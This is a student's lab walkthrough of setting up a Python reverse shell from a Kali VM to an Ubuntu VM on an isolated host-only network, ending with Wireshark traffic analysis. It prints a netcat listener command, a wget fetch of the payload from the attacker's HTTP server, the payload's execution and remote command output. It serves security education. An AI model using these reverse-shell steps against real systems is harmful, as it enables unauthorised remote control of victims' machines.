# Ubuntu Payload Creation — Lab Walkthrough

**Student Name:** Mahrukh  
**Environment:** Controlled & Isolated Lab Setup  
**Network:** Host-Only Adapter (fully isolated)

---

## Overview

This document walks through the complete process of creating and deploying a Python reverse shell payload on Ubuntu Linux within an isolated VirtualBox lab environment.

---

## Step 1 — Network Setup (Host-Only Adapter)

A Host-Only network adapter was configured on both Kali Linux and Ubuntu to maintain a fully isolated lab environment. This configuration allows communication between the two VMs **without any internet access**.

**Why Host-Only?**
- Prevents accidental exposure to real networks
- Ensures the experiment remains contained
- Simulates an isolated internal network segment

---

## Step 2 — IP Configuration Verification

IP addresses were verified on both machines to confirm they were on the same subnet.

| Machine | IP Address | Interface |
|---|---|---|
| Kali Linux (Attacker) | `192.168.56.102` | eth0 |
| Ubuntu (Victim) | `192.168.56.103` | enp0s3 |

**Command used:** `ip a`

Both machines confirmed on the `192.168.56.0/24` network.

---

## Step 3 — Connectivity Test (Ping)

Ping was performed in both directions to verify network reachability before proceeding.

```bash
# From Ubuntu → Kali
ping 192.168.56.102

# From Kali → Ubuntu
ping 192.168.56.103
```

**Result:** Successful replies confirmed — 0% packet loss, communication established.

---

## Step 4 — Python Reverse Shell Script Creation

A Python reverse shell script was written on the **Kali machine** using the `nano` editor.

```bash
nano mahrukh_payload.py
```

**Script overview:**
- Uses Python's `socket` library for TCP communication
- Connects back to the attacker machine (Kali) on port `4444`
- Receives commands in a loop via the socket
- Executes each command using `subprocess.getoutput()`
- Logs all commands and outputs to `command_log.txt`
- Closes connection cleanly on "exit" command

📄 Full script: [`../scripts/ubuntu_reverse_shell.py`](../scripts/ubuntu_reverse_shell.py)

---

## Step 5 — Listener Setup on Kali (Netcat)

Before transferring and running the payload, a Netcat listener was started on Kali to await the incoming connection.

```bash
nc -lvnp 4444
```

**Flags explained:**
| Flag | Meaning |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution (numeric IPs only) |
| `-p 4444` | Listen on port 4444 |

**Output:**
```
listening on [any] 4444 ...
```

---

## Step 6 — File Transfer to Ubuntu

The payload script was transferred from Kali to Ubuntu using Python's built-in HTTP server — a common, lightweight file transfer method.

**On Kali (host the file):**
```bash
cd /home/chippashb
python3 -m http.server 8080
```

**On Ubuntu (download the file):**
```bash
wget http://192.168.56.102:8080/mahrukh_payload.py
```

**Result:** File transferred successfully — `747 bytes` downloaded at 38.4 MB/s.

```
mahrukh_payload.py.1    100%[===================>]   747  --.-KB/s   in 0s
```

---

## Step 7 — Script Execution on Ubuntu & Session Establishment

With the Netcat listener active on Kali, the payload was executed on Ubuntu.

```bash
python3 mahrukh_payload.py
```

**On Kali, the connection was received:**
```
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 33242
```

✅ **Reverse shell session established.**

---

## Step 8 — Command Execution Through the Session

With the session active, commands were sent from Kali to Ubuntu and output was received in real time.

**Commands executed:**
```bash
whoami
# Output: vboxuser

ls
# Output: command_log.txt  Desktop  Documents  Downloads
#         mahrukh_payload.py  mahrukh_reverseshell.py
#         Music  Pictures  Public  snap  Templates  Videos
```

✅ **Remote command execution confirmed** — Kali has interactive shell access on Ubuntu.

---

## Step 9 — Wireshark Traffic Analysis

Wireshark was running on the Kali machine throughout the session to capture all TCP traffic.

**Display filter applied:**
```
tcp.port == 4444
```

**Observations:**
- TCP three-way handshake (SYN → SYN-ACK → ACK) visible
- PSH/ACK packets carrying command data between the two machines
- Source: `192.168.56.103` (Ubuntu) → Destination: `192.168.56.102` (Kali)
- All communication transmitted as **unencrypted plaintext**

**Defensive insight:** This unencrypted traffic would be trivially detected by any IDS/IPS monitoring port 4444 activity.

---

## Summary

| Step | Action | Result |
|---|---|---|
| 1 | Host-Only network configured | ✅ Isolated environment |
| 2 | IP addresses verified | ✅ Both on same subnet |
| 3 | Ping test | ✅ 0% packet loss |
| 4 | Script created on Kali | ✅ `mahrukh_payload.py` |
| 5 | Netcat listener started | ✅ Listening on 4444 |
| 6 | File transferred to Ubuntu | ✅ wget via HTTP server |
| 7 | Script executed on Ubuntu | ✅ Session established |
| 8 | Commands executed remotely | ✅ Output received |
| 9 | Wireshark capture | ✅ TCP traffic on 4444 captured |

---

*Lab conducted in a fully isolated, controlled environment for academic purposes only.*
